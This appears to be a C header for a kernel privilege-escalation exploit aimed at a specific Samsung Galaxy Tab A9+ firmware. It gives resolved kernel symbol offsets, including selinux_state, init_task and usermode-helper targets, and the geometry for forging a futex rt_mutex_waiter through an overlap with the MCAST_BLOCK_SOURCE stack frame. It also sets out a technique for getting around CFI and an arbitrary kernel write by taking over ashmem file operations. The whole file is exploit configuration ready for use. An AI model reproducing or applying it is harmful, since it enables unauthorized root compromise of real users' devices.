#ifndef TARGET_H
#define TARGET_H

/* =========================================================================
 * Target Device: Samsung Galaxy Tab A9+ 5G (SM-X216B / gta9p)
 * Firmware:      X216BXXS9DYJ7
 * Kernel:        5.4.249-qgki-31053672-abX216BXXS9DYJ7 (Qualcomm SM6375)
 * Arch / Mode:   AArch64 Little-Endian (CONFIG_CFI_CLANG=y)
 * ========================================================================= */

#define TARGET_DEVICE             "SM-X216B"
#define TARGET_BUILD              "X216BXXS9DYJ7"
#define TARGET_KERNEL             "5.4.249-qgki-31053672"

/* Kernel Virtual Address Base */
#define KIMAGE_TEXT_BASE          0xffffffc010080000ULL
#define KIMAGE_BASE               KIMAGE_TEXT_BASE

/* -------------------------------------------------------------------------
 * Resolved Kernel Symbol Offsets (addr - KIMAGE_TEXT_BASE)
 * ------------------------------------------------------------------------- */
#define INIT_TASK_OFF             0x02960280ULL
#define SYSTEM_UNBOUND_WQ_OFF     0x028ef9c8ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF         0x00297274ULL
#define CALL_USERMODEHELPER_EXEC_WORK_CFI_JT_OFF  0x01601870ULL
#define ANON_PIPE_BUF_OPS_OFF     0x021755b8ULL
#define SELINUX_STATE_OFF         0x02b1f000ULL

#define ADDR_INIT_TASK            (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ADDR_SYSTEM_UNBOUND_WQ    (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
#define ADDR_CALL_USERMODEHELPER_EXEC_WORK        (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
#define ADDR_CALL_USERMODEHELPER_EXEC_WORK_CFI_JT (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_CFI_JT_OFF)
#define ADDR_ANON_PIPE_BUF_OPS    (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define ADDR_SELINUX_STATE        (KIMAGE_TEXT_BASE + SELINUX_STATE_OFF)

/* Legacy / Scratch Addresses */
#define ADDR_VERIFIED_VLOCK       0xffffffc012f04080ULL

/* -------------------------------------------------------------------------
 * MCAST Stamping Primitive Configuration
 * -------------------------------------------------------------------------
 * On Linux 5.4 SM-X216B, native 64-bit IPv4 MCAST_BLOCK_SOURCE (optname 43)
 * copies a 264-byte struct group_source_req into do_ip_setsockopt's frame.
 *
 * MCAST_JOIN_GROUP (optname 42) uses struct group_req (136 bytes), which
 * terminates at SP_sys - 0x228, missing the waiter base at SP_sys - 0x1e8
 * by a 64-byte gap. Thus MCAST_JOIN_GROUP CANNOT reach the waiter.
 * ------------------------------------------------------------------------- */
#define MCAST_BLOCK_SOURCE        43
#define MCAST_JOIN_SOURCE_GROUP   46
#define MCAST_JOIN_GROUP          42    /* INSUFFICIENT DEPTH: 136B (gap: 64B) */

#define MCAST_STAMP_OPTNAME       MCAST_BLOCK_SOURCE
#define MCAST_STAMP_LEVEL         IPPROTO_IP
#define MCAST_STAMP_DOMAIN        AF_INET
#define MCAST_BUFFER_SIZE_64      264   /* sizeof(struct group_source_req) */

/* -------------------------------------------------------------------------
 * rt_mutex_waiter Geometry (Linux 5.4 AArch64: 80 bytes / 0x50)
 *
 * Notice: Linux 5.4 uses an 80-byte waiter, NOT 5.15's compact 88-byte layout.
 * wake_state (+0x40) and ww_ctx (+0x50) DO NOT EXIST in 5.4.
 * Active control words in rt_mutex_adjust_prio_chain strictly require
 * waiter_word <= 7.
 * ------------------------------------------------------------------------- */
#define RT_MUTEX_WAITER_SIZE      80
#define FAKE_WAITER_TREE_ENTRY_OFF      0x00  /* rb_node: 0x00, 0x08, 0x10 */
#define FAKE_WAITER_PI_TREE_ENTRY_OFF   0x18  /* rb_node: 0x18, 0x20, 0x28 */
#define FAKE_WAITER_TASK_OFF            0x30  /* Word 6: struct task_struct * */
#define FAKE_WAITER_LOCK_OFF            0x38  /* Word 7: struct rt_mutex * */
#define FAKE_WAITER_PRIO_OFF            0x40  /* Word 8: int prio */
#define FAKE_WAITER_DEADLINE_OFF        0x48  /* Word 9: u64 deadline */

/* -------------------------------------------------------------------------
 * 64-bit Direct MCAST Overlap Offsets
 *
 * Futex Waiter base: SP_sys - 0x1e8
 * MCAST buffer:      SP_sys - 0x2b0 ... SP_sys - 0x1a8
 *
 * Offset of Waiter Base inside MCAST buffer = 0x2b0 - 0x1e8 = 0xc8 (200 bytes)
 * ------------------------------------------------------------------------- */
#define MCAST_64_WAITER_BASE_OFF  0xc8  /* 200 bytes */
#define MCAST_64_TASK_OFF         0xf8  /* 248 bytes (Word 6: waiter->task) */
#define MCAST_64_LOCK_OFF         0x100 /* 256 bytes (Word 7: waiter->lock) */

/* -------------------------------------------------------------------------
 * Clang Forward-Edge CFI Jump Table (.cfi_jt) Configuration
 *
 * Kernel built with CONFIG_CFI_CLANG=y (strict enforcement).
 * Any forged function pointer invoked via indirect call must target the
 * corresponding compiler-generated .cfi_jt thunk rather than the direct
 * function body.
 *
 * Useful for workqueue / UMH escalation:
 *   work->func = CALL_USERMODEHELPER_EXEC_WORK_CFI_JT (0xffffffc011681870)
 * ------------------------------------------------------------------------- */
/* -------------------------------------------------------------------------
 * Configfs Virtual Write Channel & Ashmem Definitions
 *
 * Used for arbitrary kernel virtual write without CAP_SYS_ADMIN / pagemap.
 * Ashmem fd file->f_op is hijacked to target CONFIGFS_WRITE_BIN_FILE_CFI_JT,
 * with file->private_data pointing to a forged struct configfs_buffer.
 * ------------------------------------------------------------------------- */
#define ASHMEM_FOPS_OFF                   0x0214ee28ULL /* 0xffffffc0121cee28 */
#define CONFIGFS_WRITE_BIN_FILE_OFF       0x00559784ULL /* 0xffffffc0105d9784 */
#define CONFIGFS_WRITE_BIN_FILE_CFI_JT_OFF 0x015f595cULL /* 0xffffffc01167595c */
#define CONFIGFS_READ_BIN_FILE_OFF        0x0055958cULL /* 0xffffffc0105d958c */
#define CONFIGFS_READ_BIN_FILE_CFI_JT_OFF 0x015f38d8ULL /* 0xffffffc0116738d8 */

#define ADDR_ASHMEM_FOPS                  (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ADDR_CONFIGFS_WRITE_BIN_FILE_CFI_JT (KIMAGE_TEXT_BASE + CONFIGFS_WRITE_BIN_FILE_CFI_JT_OFF)
#define ADDR_CONFIGFS_READ_BIN_FILE_CFI_JT  (KIMAGE_TEXT_BASE + CONFIGFS_READ_BIN_FILE_CFI_JT_OFF)

/* Linux 5.4 struct configfs_buffer offsets */
#define CFG_MUTEX_OFF                     0x20
#define CFG_READ_IN_PROGRESS_OFF          0x44  /* byte */
#define CFG_WRITE_IN_PROGRESS_OFF         0x45  /* byte */
#define CFG_BIN_BUFFER_OFF                0x48  /* void *bin_buffer */
#define CFG_BIN_BUFFER_SIZE_OFF           0x50  /* int bin_buffer_size */
#define CFG_CB_MAX_SIZE_OFF               0x54  /* size_t cb_max_size */

/* Linux 5.4 file_operations offsets */
#define FOPS_WRITE_OFF                    0x18
#define FOPS_WRITE_ITER_OFF               0x28

#endif /* TARGET_H */
